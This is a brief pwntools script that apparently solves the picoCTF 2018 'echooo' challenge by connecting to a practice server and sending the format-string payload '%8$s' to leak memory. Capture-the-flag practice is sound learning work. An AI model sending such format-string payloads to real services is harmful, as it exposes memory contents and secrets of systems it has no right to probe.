from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('PicoCTF_2018_echooo')
io = remote('node4.buuoj.cn', 27645)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf = ELF('PicoCTF_2018_echooo')

io.sendlineafter('> ', '%8$s')
io.recv()
